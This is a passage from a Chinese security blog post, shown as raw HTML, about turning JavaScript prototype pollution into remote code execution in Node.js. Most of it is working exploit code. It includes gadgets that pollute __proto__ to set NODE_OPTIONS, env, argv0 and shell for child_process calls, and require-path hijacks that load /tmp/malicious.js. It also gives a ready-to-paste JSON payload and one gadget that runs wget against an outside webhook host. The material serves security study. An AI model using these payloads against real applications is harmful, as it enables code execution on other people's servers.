class="comment">//You need to make sure the node executable is executed</span></span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">env</span> = &#123; <span class="string">&quot;EVIL&quot;</span>:<span class="string">&quot;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;touch /tmp/execFileSync-environ&#x27;).toString())//&quot;</span>&#125;</span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">NODE_OPTIONS</span> = <span class="string">&quot;--require /proc/self/environ&quot;</span></span><br><span class="line"><span class="keyword">var</span> proc = <span class="title function_">execFileSync</span>(<span class="string">&#x27;something&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>cmdline：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cmdline trick - working with small variation (shell)</span></span><br><span class="line"><span class="comment">// Working after kEmptyObject (fix)</span></span><br><span class="line"><span class="keyword">const</span> &#123; execFileSync &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">p = &#123;&#125;</span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">shell</span> = <span class="string">&quot;/proc/self/exe&quot;</span> <span class="comment">//You need to make sure the node executable is executed</span></span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">argv0</span> = <span class="string">&quot;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;touch /tmp/execFileSync-cmdline&#x27;).toString())//&quot;</span></span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">NODE_OPTIONS</span> = <span class="string">&quot;--require /proc/self/cmdline&quot;</span></span><br><span class="line"><span class="keyword">var</span> proc = <span class="title function_">execFileSync</span>(<span class="string">&#x27;something&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>stdin，居然可以直接调用 vim 写入文件：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stdin trick - working</span></span><br><span class="line"><span class="comment">// Working after kEmptyObject (fix)</span></span><br><span class="line"><span class="keyword">const</span> &#123; execFileSync &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">p = &#123;&#125;</span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">argv0</span> = <span class="string">&quot;/usr/bin/vim&quot;</span></span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">shell</span> = <span class="string">&quot;/usr/bin/vim&quot;</span></span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">input</span> = <span class="string">&#x27;:!&#123;touch /tmp/execFileSync-stdin&#125;\n&#x27;</span></span><br><span class="line"><span class="keyword">var</span> proc = <span class="title function_">execFileSync</span>(<span class="string">&#x27;something&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h4 id="5-execSync"><a href="#5-execSync" class="headerlink" title="5.execSync"></a>5.execSync</h4><p>和execFileSync一样，只是换了函数而已</p>
<h4 id="6-spawnSync"><a href="#6-spawnSync" class="headerlink" title="6.spawnSync"></a>6.spawnSync</h4><p>同上</p>
<h3 id="主动调用spawn"><a href="#主动调用spawn" class="headerlink" title="主动调用spawn"></a>主动调用spawn</h3><p>前面的操作都是基于代码中调用了<code>spawn</code>的功能，如果代码没有调用它但是存在 require 的话，我们可以尝试通过原型链污染来包含依赖中调用了 spawn 的 js 文件</p>
<p>一些常见的文件：</p>
<ul>
<li><p>&#x2F;path&#x2F;to&#x2F;npm&#x2F;scripts&#x2F;changelog.js</p>
</li>
<li><p>&#x2F;opt&#x2F;yarn-v1.22.19&#x2F;preinstall.js</p>
</li>
<li><p>node_modules&#x2F;buffer&#x2F;bin&#x2F;<strong>download-node-tests.js</strong>:17</p>
<p><code>cp.execSync(&#39;rm -rf node/*.js&#39;, &#123; cwd: path.join(__dirname, &#39;../test&#39;) &#125;)</code></p>
</li>
<li><p>node_modules&#x2F;buffer&#x2F;bin&#x2F;<strong>test.js</strong>:10</p>
<p><code>var node = cp.spawn(&#39;npm&#39;, [&#39;run&#39;, &#39;test-node&#39;], &#123; stdio: &#39;inherit&#39; &#125;)</code></p>
</li>
<li><p>node_modules&#x2F;npm&#x2F;scripts&#x2F;<strong>changelog.js</strong>:16</p>
<p><code>const log = execSync(git log --reverse --pretty=&#39;format:%h %H%d %s (%aN)%n%b%n---%n&#39; $&#123;branch&#125;...).toString().split(/\n/)</code></p>
</li>
<li><p>node_modules&#x2F;detect-libc&#x2F;bin&#x2F;<strong>detect-libc.js</strong>:18</p>
<p><code>process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);</code></p>
</li>
<li><p>node_modules&#x2F;jest-expo&#x2F;bin&#x2F;<strong>jest.js</strong>:26</p>
<p><code>const result = childProcess.spawnSync(&#39;node&#39;, jestWithArgs, &#123; stdio: &#39;inherit&#39; &#125;);</code></p>
</li>
<li><p>node_modules&#x2F;buffer&#x2F;bin&#x2F;<strong>download-node-tests.js</strong>:17</p>
<p><code>cp.execSync(&#39;rm -rf node/*.js&#39;, &#123; cwd: path.join(__dirname, &#39;../test&#39;) &#125;)</code></p>
</li>
<li><p>node_modules&#x2F;buffer&#x2F;bin&#x2F;<strong>test.js</strong>:10</p>
<p><code>var node = cp.spawn(&#39;npm&#39;, [&#39;run&#39;, &#39;test-node&#39;], &#123; stdio: &#39;inherit&#39; &#125;)</code></p>
</li>
<li><p>node_modules&#x2F;runtypes&#x2F;scripts&#x2F;<strong>format.js</strong>:13</p>
<p><code>const npmBinPath = execSync(&#39;npm bin&#39;).toString().trim();</code></p>
</li>
<li><p>node_modules&#x2F;node-pty&#x2F;scripts&#x2F;<strong>publish.js</strong>:31</p>
<p><code>const result = cp.spawn(&#39;npm&#39;, args, &#123; stdio: &#39;inherit&#39; &#125;);</code></p>
</li>
</ul>
<h4 id="原型链污染设置-require-路径"><a href="#原型链污染设置-require-路径" class="headerlink" title="原型链污染设置 require 路径"></a>原型链污染设置 require 路径</h4><h5 id="绝对require"><a href="#绝对require" class="headerlink" title="绝对require"></a>绝对require</h5><p>如果执行的 require 是<strong>绝对的</strong>（<code>require(&quot;bytes&quot;)</code>），并且这个包在 package.json 文件中不包含 main，可以直接污染 main 属性并使 require 执行不同的文件</p>
<blockquote>
<p>main字段：定义了 <code>npm</code> 包的入口文件，比如说 npm 包 test 下有 lib&#x2F;index.js 作为入口文件，那么 package.json 中的写法就是<code> &quot;main&quot;: &quot;lib/index.js&quot;</code></p>
</blockquote>
<p>exp：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create a file called malicious.js in /tmp</span></span><br><span class="line"><span class="comment">// Contents of malicious.js in the other tab</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Install package bytes (it doesn&#x27;t have a main in package.json)</span></span><br><span class="line"><span class="comment">// npm install bytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Manual Pollution</span></span><br><span class="line">b = &#123;&#125;</span><br><span class="line">b.<span class="property">__proto__</span>.<span class="property">main</span> = <span class="string">&quot;/tmp/malicious.js&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Trigger gadget</span></span><br><span class="line"><span class="keyword">var</span> proc = <span class="built_in">require</span>(<span class="string">&#x27;bytes&#x27;</span>);</span><br><span class="line"><span class="comment">// This should execute the file /tmp/malicious.js</span></span><br><span class="line"><span class="comment">// The relative path doesn&#x27;t even need to exist</span></span><br></pre></td></tr></table></figure>

<p>malicious.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; fork &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hellooo from malicious&quot;</span>);</span><br><span class="line"><span class="title function_">fork</span>(<span class="string">&quot;anything&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>json速抄：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/malicious.js&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;NODE_OPTIONS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;--require /proc/self/cmdline&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;argv0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;console.log(require(\\\&quot;child_process\\\&quot;).execSync(\\\&quot;touch /tmp/pp2rce_absolute\\\&quot;).toString())//&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h5 id="相对require"><a href="#相对require" class="headerlink" title="相对require"></a>相对require</h5><p>如果加载的是相对路径而不是绝对路径，可以使节点加载不同的路径：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create a file called malicious.js in /tmp</span></span><br><span class="line"><span class="comment">// Contents of malicious.js in the other tab</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Manual Pollution</span></span><br><span class="line">b = &#123;&#125;</span><br><span class="line">b.<span class="property">__proto__</span>.<span class="property">exports</span> = &#123; <span class="string">&quot;.&quot;</span>: <span class="string">&quot;./malicious.js&quot;</span> &#125;</span><br><span class="line">b.<span class="property">__proto__</span>[<span class="string">&quot;1&quot;</span>] = <span class="string">&quot;/tmp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Trigger gadget</span></span><br><span class="line"><span class="keyword">var</span> proc = <span class="built_in">require</span>(<span class="string">&#x27;./relative_path.js&#x27;</span>);</span><br><span class="line"><span class="comment">// This should execute the file /tmp/malicious.js</span></span><br><span class="line"><span class="comment">// The relative path doesn&#x27;t even need to exist</span></span><br></pre></td></tr></table></figure>

<p>法2：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create a file called malicious.js in /tmp</span></span><br><span class="line"><span class="comment">// Contents of malicious.js in the other tab</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Manual Pollution</span></span><br><span class="line">b = &#123;&#125;</span><br><span class="line">b.<span class="property">__proto__</span>.<span class="property">data</span> = &#123;&#125;</span><br><span class="line">b.<span class="property">__proto__</span>.<span class="property">data</span>.<span class="property">exports</span> = &#123; <span class="string">&quot;.&quot;</span>: <span class="string">&quot;./malicious.js&quot;</span> &#125;</span><br><span class="line">b.<span class="property">__proto__</span>.<span class="property">path</span> = <span class="string">&quot;/tmp&quot;</span></span><br><span class="line">b.<span class="property">__proto__</span>.<span class="property">name</span> = <span class="string">&quot;./relative_path.js&quot;</span> <span class="comment">//This needs to be the relative path that will be imported in the require</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Trigger gadget</span></span><br><span class="line"><span class="keyword">var</span> proc = <span class="built_in">require</span>(<span class="string">&#x27;./relative_path.js&#x27;</span>);</span><br><span class="line"><span class="comment">// This should execute the file /tmp/malicious.js</span></span><br><span class="line"><span class="comment">// The relative path doesn&#x27;t even need to exist</span></span><br></pre></td></tr></table></figure>

<p>法3：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Requiring /opt/yarn-v1.22.19/preinstall.js</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[<span class="string">&quot;data&quot;</span>] = &#123;</span><br><span class="line"><span class="attr">exports</span>: &#123;</span><br><span class="line"><span class="string">&quot;.&quot;</span>: <span class="string">&quot;./preinstall.js&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;./usage&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[<span class="string">&quot;path&quot;</span>] = <span class="string">&#x27;/opt/yarn-v1.22.19&#x27;</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">shell</span> = <span class="string">&quot;node&quot;</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[<span class="string">&quot;npm_config_global&quot;</span>] = <span class="number">1</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">env</span> = &#123;</span><br><span class="line"><span class="string">&quot;NODE_DEBUG&quot;</span>: <span class="string">&quot;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;wget$&#123;IFS&#125;https://webhook.site?q=2&#x27;).toString());process.exit()//&quot;</span>,</span><br><span class="line"><span class="string">&quot;NODE_OPTIONS&quot;</span>: <span class="string">&quot;--require=/proc/self/environ&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;./usage.js&#x27;</span>)</span><br></pre></td></tr></table></figure>




        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Meteor_Kai</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://meteorkai.github.io/2025/05/09/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">http://meteorkai.github.io/2025/05/09/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>CyberSecurity brings me great joy!</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/JavaScript/"># JavaScript</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2025/05/17/2025%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/">2025第三届盘古石杯初赛wp</a>
            
            
            <a class="next" rel="next" href="/2025/05/09/Docker-Escape-Summary/">Docker Escape Summary</a>
            
        </section>

        
        <section class="post-comment">
            <div id="valine-container"></div>
            <!-- Valine 评论系统 -->
            <script src="https://cdn.jsdelivr.net/npm/valine@1.4.18/dist/Valine.min.js"></script>
            <script>
                new Valine({
                    el: '#valine-container',
                    appId: 'J9Tzs8qCVpZQccTG8gHzu31a-gzGzoHsz',
                    appKey: 'VXWXI3d4fxyIbcYlcOrlbYRX',
                    placeholder: '留下你的评论吧！',
                    path: window.location.pathname,
                    avatar: 'monsterid',
                    meta: [&#34;nick&#34;,&#34;mail&#34;,&#34;link&#34;],
                    pageSize: 10,
                    lang: 'zh-CN',
                    visitor: true,
                    highlight: true,
                    recordIP: false,
                    serverURLs: '',
                    emojiCDN: '',
                    emojiMaps: null,
                    enableQQ: true,
                    requiredFields: []
                })
            </script>
        </section>
        

    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Meteor_Kai | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
        <span class="post-meta-divider">|</span>
        <span id="busuanzi_container_site_uv">
            访客数：<span id="busuanzi_value_site_uv"></span>
        </span>
        <span class="post-meta-divider">|</span>
        <span id="busuanzi_container_site_pv">
            总访问量：<span id="busuanzi_value_site_pv"></span>
        </span>
    </div>
    <!-- 不蒜子计数器 -->
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</footer>

    </div>
</body>

</html>